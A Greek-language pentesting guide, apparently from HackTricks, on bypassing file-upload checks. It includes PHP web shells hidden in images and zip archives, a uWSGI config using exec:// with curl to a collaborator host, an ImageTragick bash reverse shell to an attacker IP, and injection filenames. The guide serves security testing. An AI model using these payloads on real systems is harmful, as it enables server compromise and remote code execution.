# Ανέβασμα Αρχείων

{{#include ../../banners/hacktricks-training.md}}

## Γενική Μεθοδολογία για Ανέβασμα Αρχείων

Άλλες χρήσιμες επεκτάσεις:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Παράκαμψη ελέγχων επεκτάσεων αρχείων

1. Αν εφαρμόζονται, **ελέγξτε** τις **προηγούμενες επεκτάσεις.** Δοκιμάστε τις επίσης με μερικά **κεφαλαία γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Ελέγξτε **την προσθήκη μιας έγκυρης επέκτασης πριν** την εκτελέσιμη επέκταση (χρησιμοποιήστε και τις προηγούμενες επεκτάσεις):_
- _file.png.php_
- _file.png.Php5_
3. Δοκιμάστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε Burp για να **bruteforce** όλους τους **ascii** και **Unicode** χαρακτήρες. (_Σημειώστε ότι μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγουμένως** αναφερθείσες **επεκτάσεις**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τις προστασίες **ξεγελώντας τον parser των επεκτάσεων** στην πλευρά του server με τεχνικές όπως **doubling** της **επέκτασης** ή **προσθήκη junk** δεδομένων (**null** bytes) ανάμεσα σε επεκτάσεις. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να φτιάξετε καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **άλλο ένα στρώμα επεκτάσεων** στον προηγούμενο έλεγχο:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Προσπαθήστε να βάλετε την **εκτελέσιμη επέκταση πριν** από την έγκυρη επέκταση και ελπίζετε ότι ο server είναι κακώς ρυθμισμένος. (χρήσιμο για εκμετάλλευση λανθασμένων ρυθμίσεων Apache όπου οτιδήποτε με επέκταση **.php**, αλλά **δεν τελειώνει απαραίτητα σε .php**, θα εκτελέσει κώδικα):
- _ex: file.php.png_
7. Χρησιμοποιώντας **NTFS alternate data stream (ADS)** στα **Windows**. Σε αυτή την περίπτωση, ένας χαρακτήρας άνω-κάτω τελείας ":" θα εισαχθεί μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπτή. Ως αποτέλεσμα, ένα **κενό αρχείο με την απαγορευμένη επέκταση** θα δημιουργηθεί στον server (π.χ. "file.asax:.jpg”). Αυτό το αρχείο μπορεί να επεξεργαστεί αργότερα με άλλες τεχνικές όπως η χρήση του short filename. Το μοτίβο "**::$data**” μπορεί επίσης να χρησιμοποιηθεί για να δημιουργήσει μη-κενά αρχεία. Επομένως, η προσθήκη ενός dot χαρακτήρα μετά από αυτό το μοτίβο μπορεί επίσης να είναι χρήσιμη για να παρακαμφθούν επιπλέον περιορισμοί (π.χ. "file.asp::$data.”)
8. Προσπαθήστε να σπάσετε τα όρια του ονόματος αρχείου. Η έγκυρη επέκταση κόβεται και το κακόβουλο PHP παραμένει. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Παράκαμψη Content-Type, Magic Number, Compression & Resizing

- Παράκαμψη ελέγχων **Content-Type** ορίζοντας την **τιμή** της κεφαλίδας **Content-Type** σε: _image/png_ , _text/plain_, _application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Παράκαμψη ελέγχου **magic number** προσθέτοντας στην αρχή του αρχείου τα **bytes μιας πραγματικής εικόνας** (να μπερδεύσετε την εντολή _file_). Ή εισάγοντας το shell μέσα στα **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ή μπορείτε επίσης να **εισάγετε το payload απευθείας** σε μια εικόνα:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Εάν **γίνεται συμπίεση** στην εικόνα, για παράδειγμα χρησιμοποιώντας κάποιες standard PHP βιβλιοθήκες όπως [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές μπορεί να μην είναι χρήσιμες. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κάποιo κείμενο που θα **επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Η σελίδα μπορεί επίσης να **αλλάζει μέγεθος** στην εικόνα, χρησιμοποιώντας για παράδειγμα τις PHP-GD συναρτήσεις `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Μια άλλη τεχνική για να φτιάξετε ένα payload που **επιβιώνει του resizing εικόνας**, χρησιμοποιώντας τη PHP-GD συνάρτηση `thumbnailImage`. Επίσης, μπορείτε να χρησιμοποιήσετε το **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Άλλα κόλπα για έλεγχο

- Βρείτε ευπάθεια που να επιτρέπει το **rename** του αρχείου που έχει ήδη ανέβει (για αλλαγή της επέκτασης).
- Βρείτε ευπάθεια **Local File Inclusion** για να εκτελέσετε το backdoor.
- **Πιθανή αποκάλυψη πληροφοριών**:
1. Ανεβάστε **πολλαπλές φορές** (και **ταυτόχρονα**) το **ίδιο αρχείο** με το **ίδιο όνομα**
2. Ανεβάστε ένα αρχείο με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Ανέβασμα αρχείου με **".", "..", ή "…"** ως όνομα. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα ανεβασμένα αρχεία στο "/www/uploads/" directory, το όνομα αρχείου "." θα δημιουργήσει ένα αρχείο που ονομάζεται "uploads" στον "/www/" φάκελο.
4. Ανεβάστε ένα αρχείο που μπορεί να μην διαγραφεί εύκολα όπως **"…:.jpg”** σε **NTFS**. (Windows)
5. Ανεβάστε ένα αρχείο σε **Windows** με **μη έγκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Ανεβάστε ένα αρχείο σε **Windows** χρησιμοποιώντας **κρατημένα** (**forbidden**) **ονόματα** όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Δοκιμάστε επίσης να **ανεβάσετε ένα εκτελέσιμο** (.exe) ή ένα **.html** (λιγότερο ύποπτο) που **θα εκτελέσει κώδικα** όταν ακούσια ανοίξει από το θύμα.

### Ειδικά κόλπα επεκτάσεων

Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **PHP server**, ρίξτε μια ματιά στο κόλπο **.htaccess** για εκτέλεση κώδικα: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution].\
Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **ASP server**, ρίξτε μια ματιά στο κόλπο **.config** για εκτέλεση κώδικα: ../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files.

Τα `.phar` αρχεία είναι σαν τα `.jar` για java, αλλά για php, και μπορούν να **χρησιμοποιηθούν σαν php αρχείο** (να εκτελεστούν με php, ή να συμπεριληφθούν μέσα σε ένα script...)

Η επέκταση `.inc` μερικές φορές χρησιμοποιείται για php αρχεία που χρησιμοποιούνται μόνο για **import files**, οπότε, σε κάποιο σημείο, κάποιος μπορεί να έχει επιτρέψει **αυτή την επέκταση να εκτελείται**.

## **Jetty RCE**

Αν μπορείτε να ανεβάσετε ένα XML αρχείο σε έναν Jetty server μπορείτε να αποκτήσετε [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Οπότε, όπως αναφέρεται στην εικόνα παρακάτω, ανεβάστε το XML αρχείο στο `$JETTY_BASE/webapps/` και περιμένετε το shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Για αναλυτική διερεύνηση αυτής της ευπάθειας δείτε την αρχική έρευνα: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ευπάθειες μπορούν να εκμεταλλευτούν σε uWSGI servers εάν κάποιος έχει τη δυνατότητα να τροποποιήσει το αρχείο ρυθμίσεων `.ini`. Τα αρχεία ρυθμίσεων uWSGI χρησιμοποιούν μια συγκεκριμένη σύνταξη για να ενσωματώνουν "magic" μεταβλητές, placeholders και operators. Σημαντικά, ο operator '@', που χρησιμοποιείται ως `@(filename)`, έχει σχεδιαστεί για να περιλαμβάνει τα περιεχόμενα ενός αρχείου. Μεταξύ των διαφόρων υποστηριζόμενων schemes στο uWSGI, το scheme "exec" είναι ιδιαίτερα ισχυρό, επιτρέποντας την ανάγνωση δεδομένων από το standard output μιας διεργασίας. Αυτή η δυνατότητα μπορεί να χειραγωγηθεί για κακόβουλους σκοπούς όπως Remote Command Execution ή Arbitrary File Write/Read όταν επεξεργάζεται ένα `.ini` αρχείο ρυθμίσεων.

Σκεφτείτε το ακόλουθο παράδειγμα ενός επιβλαβούς `uwsgi.ini` αρχείου, που δείχνει διάφορα schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload συμβαίνει κατά την ανάλυση του αρχείου ρυθμίσεων. Για να ενεργοποιηθεί και να γίνει parsing η ρύθμιση, η διαδικασία uWSGI πρέπει είτε να επανέλθει (πιθανώς μετά από ένα crash ή λόγω μιας Denial of Service επίθεσης) είτε το αρχείο πρέπει να είναι ρυθμισμένο σε auto-reload. Η λειτουργία auto-reload, αν είναι ενεργοποιημένη, φορτώνει ξανά το αρχείο σε καθορισμένα διαστήματα όταν εντοπίζει αλλαγές.

Είναι κρίσιμο να κατανοήσουμε την επιεική φύση του parsing των αρχείων ρυθμίσεων του uWSGI. Συγκεκριμένα, το συζητούμενο payload μπορεί να εισαχθεί σε ένα binary αρχείο (όπως μια εικόνα ή PDF), διευρύνοντας περαιτέρω το πεδίο πιθανής εκμετάλλευσης.

## **wget File Upload/SSRF Trick**

Σε ορισμένες περιπτώσεις μπορεί να διαπιστώσετε ότι ένας server χρησιμοποιεί **`wget`** για **να κατεβάζει αρχεία** και μπορείτε να **υποδείξετε** το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι η επέκταση των κατεβαζόμενων αρχείων ανήκει σε μια whitelist ώστε να διασφαλίζεται ότι θα κατέβουν μόνο επιτρεπτά αρχεία. Ωστόσο, **αυτός ο έλεγχος μπορεί να παρακαμφθεί.**\
Το **μέγιστο** μήκος ενός **όνομα αρχείου** σε **linux** είναι **255**, ωστόσο το **wget** περικόπτει τα ονόματα αρχείων σε **236** χαρακτήρες. Μπορείτε να **κατεβάσετε ένα αρχείο με όνομα "A"\*232+".php"+".gif"**, αυτό το όνομα θα **παρακάμψει** τον **έλεγχο** (όπως σε αυτό το παράδειγμα **".gif"** είναι μια **έγκυρη** επέκταση) αλλά `wget` θα **μετονομάσει** το αρχείο σε **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Σημειώστε ότι **μια άλλη επιλογή** που μπορεί να σκέφτεστε για να παρακάμψετε αυτόν τον έλεγχο είναι να κάνετε τον **HTTP server να ανακατευθύνει σε διαφορετικό αρχείο**, έτσι το αρχικό URL θα παρακάμψει τον έλεγχο και τότε το wget θα κατεβάσει το ανακατευθυνθέν αρχείο με το νέο όνομα. Αυτό **δεν θα λειτουργήσει** **εκτός αν** το wget χρησιμοποιείται με την **παράμετρο** `--trust-server-names` επειδή **το wget θα κατεβάσει τη σελίδα της ανακατεύθυνσης με το όνομα του αρχείου που υποδεικνύεται στο αρχικό URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) είναι ένα ισχυρό εργαλείο σχεδιασμένο να βοηθάει Pentesters και Bug Hunters στο testing μηχανισμών file upload. Εκμεταλλεύεται διάφορες bug bounty τεχνικές για να απλοποιήσει τη διαδικασία εντοπισμού και εκμετάλλευσης ευπαθειών, εξασφαλίζοντας διεξοδικές αξιολογήσεις web εφαρμογών.

### Corrupting upload indices with snprintf quirks (historical)

Κάποιοι legacy handlers για upload που χρησιμοποιούν `snprintf()` ή παρόμοια για να χτίσουν multi-file arrays από ένα single-file upload μπορούν να εξαπατηθούν ώστε να πλαστογραφήσουν τη δομή `_FILES`. Λόγω ασυνεπειών και περικοπών στη συμπεριφορά του `snprintf()`, ένα προσεκτικά κατασκευασμένο single upload μπορεί να εμφανιστεί ως πολλαπλά indexed files στην πλευρά του server, μπερδεύοντας λογική που υποθέτει συγκεκριμένο σχήμα (π.χ., το θεωρεί multi-file upload και παίρνει unsafe branches). Παρότι σήμερα είναι πιο niche, το pattern αυτό της “index corruption” περιστασιακά αναβιώνει σε CTFs και παλαιότερα codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Αν μπορείτε να **υποδείξετε στον web server να πάρει μια εικόνα από ένα URL** μπορείτε να προσπαθήσετε να καταχραστείτε ένα [SSRF](../ssrf-server-side-request-forgery/index.html). Αν αυτή η **image** πρόκειται να **αποθηκευτεί** σε κάποιο **public** site, μπορείτε επίσης να υποδείξετε ένα URL από [https://iplogger.org/invisible/](https://iplogger.org/invisible/) και να **κλέψετε πληροφορίες από κάθε επισκέπτη**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Ειδικά κατασκευασμένα PDFs για XSS: Η [παρακάτω σελίδα παρουσιάζει πώς να **ενχύσετε PDF δεδομένα για να επιτύχετε JS execution**](../xss-cross-site-scripting/pdf-injection.md). Αν μπορείτε να ανεβάσετε PDFs, μπορείτε να φτιάξετε κάποιο PDF που θα εκτελεί arbitrary JS ακολουθώντας τις δοθείσες οδηγίες.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content για να ελέγξετε αν ο server έχει κάποιο **antivirus**
- Ελέγξτε αν υπάρχει κάποιο **size limit** κατά το uploading αρχείων

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Αναφερθείτε στο [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) για άλλους τύπους αρχείων.

## Zip/Tar File Automatically decompressed Upload

Αν μπορείτε να ανεβάσετε ένα ZIP που πρόκειται να αποσυμπιεστεί μέσα στον server, μπορείτε να κάνετε 2 πράγματα:

### Symlink

Upload ένα archive που περιέχει soft links προς άλλα αρχεία, και στη συνέχεια, προσπελάζοντας τα αποσυμπιεσμένα αρχεία θα έχετε πρόσβαση στα linked αρχεία:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Αποσυμπίεση σε διαφορετικούς φακέλους

Η απρόσμενη δημιουργία αρχείων σε καταλόγους κατά την αποσυμπίεση αποτελεί σημαντικό ζήτημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να αποτρέψει την εκτέλεση εντολών σε επίπεδο OS μέσω κακόβουλων file uploads, η ιεραρχική υποστήριξη συμπίεσης και οι δυνατότητες directory traversal της μορφής αρχείου ZIP μπορούν να εκμεταλλευτούν. Αυτό επιτρέπει σε επιτιθέμενους να παρακάμψουν περιορισμούς και να διαφύγουν από ασφαλείς upload directories χειραγωγώντας τη λειτουργία αποσυμπίεσης της στοχευόμενης εφαρμογής.

Διαθέσιμο είναι ένα αυτοματοποιημένο exploit για τη δημιουργία τέτοιων αρχείων στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Το εργαλείο μπορεί να χρησιμοποιηθεί όπως φαίνεται:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, το **symlink trick with evilarc** είναι μια επιλογή. Εάν ο στόχος είναι να στοχεύσετε ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργηθεί ένα symlink προς αυτό το αρχείο στο σύστημά σας. Αυτό διασφαλίζει ότι το evilarc δεν θα συναντήσει σφάλματα κατά τη λειτουργία του.

Παρακάτω υπάρχει ένα παράδειγμα κώδικα Python που χρησιμοποιείται για τη δημιουργία ενός κακόβουλου zip αρχείου:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Κατάχρηση συμπίεσης για file spraying**

Για περισσότερες πληροφορίες **δείτε το αρχικό post στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Ο PHP κώδικας γράφεται για να εκτελεί εντολές που δίνονται μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Δημιουργούνται πολλαπλά αρχεία και συναρμολογείται ένα zip αρχείο που περιέχει αυτά τα αρχεία.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Τα ονόματα των αρχείων μέσα στο zip τροποποιούνται χρησιμοποιώντας vi ή Hex Editor, αντικαθιστώντας το "xxA" με "../" to traverse directories.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με επέκταση εικόνας για να exploit the vulnerability **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP Shell σε PNG

Η ενσωμάτωση ενός PHP shell στο chunk IDAT ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συνήθως για resizing και resampling εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες αποτελεί σημαντικό πλεονέκτημα για ορισμένες χρήσεις.

Μια λεπτομερής ανάλυση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των πιθανών εφαρμογών της, παρέχεται στο ακόλουθο άρθρο: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Αυτός ο πόρος προσφέρει μια ολοκληρωμένη κατανόηση της διαδικασίας και των επιπτώσεών της.

Περισσότερες πληροφορίες σε: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Τα polyglot αρχεία λειτουργούν ως μοναδικό εργαλείο στην κυβερνοασφάλεια, ενεργώντας σαν χαμαιλέοντες που μπορούν νόμιμα να υπάρξουν σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα συναρπαστικό παράδειγμα είναι το [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα hybrid που λειτουργεί τόσο ως GIF όσο και ως RAR archive. Τέτοια αρχεία δεν περιορίζονται σε αυτό το συνδυασμό· δυνατοί είναι και συνδυασμοί όπως GIF και JS ή PPT και JS.

Η βασική χρησιμότητα των polyglot αρχείων έγκειται στην ικανότητά τους να παρακάμπτουν μέτρα ασφαλείας που ελέγχουν αρχεία βάσει τύπου. Συνηθισμένη πρακτική σε διάφορες εφαρμογές είναι να επιτρέπονται μόνο συγκεκριμένοι τύποι αρχείων για upload—όπως JPEG, GIF, ή DOC—για να μειωθεί ο κίνδυνος που προκαλούν δυνητικά επικίνδυνα formats (π.χ. JS, PHP, ή Phar αρχεία). Ωστόσο, ένα polyglot, συμμορφούμενο με τις δομικές προδιαγραφές πολλαπλών τύπων αρχείων, μπορεί να παρακάμψει κρυφά αυτούς τους περιορισμούς.

Παρά την προσαρμοστικότητά τους, τα polyglots αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να ενσωματώνει ένα PHAR file και ένα JPEG, η επιτυχία του upload μπορεί να εξαρτηθεί από την πολιτική επέκτασης αρχείων της πλατφόρμας. Αν το σύστημα είναι αυστηρό όσον αφορά τις επιτρεπόμενες επεκτάσεις, η απλή δομική διττότητα ενός polyglot μπορεί να μην αρκεί για να εξασφαλίσει το upload.

Περισσότερες πληροφορίες σε: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Πώς να αποφύγετε τις ανιχνεύσεις τύπου αρχείου ανεβάζοντας ένα έγκυρο JSON ακόμα κι αν δεν επιτρέπεται, προσποιώντας ότι είναι PDF (τεχνικές από **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmagic` library**: Εφόσον τα μαγικά bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes θεωρείται έγκυρο (βλ. παράδειγμα στο άρθρο)
- **`pdflib` library**: Προσθέστε ένα ψεύτικο PDF format μέσα σε ένα field του JSON ώστε η library να νομίζει ότι είναι pdf (βλ. παράδειγμα στο άρθρο)
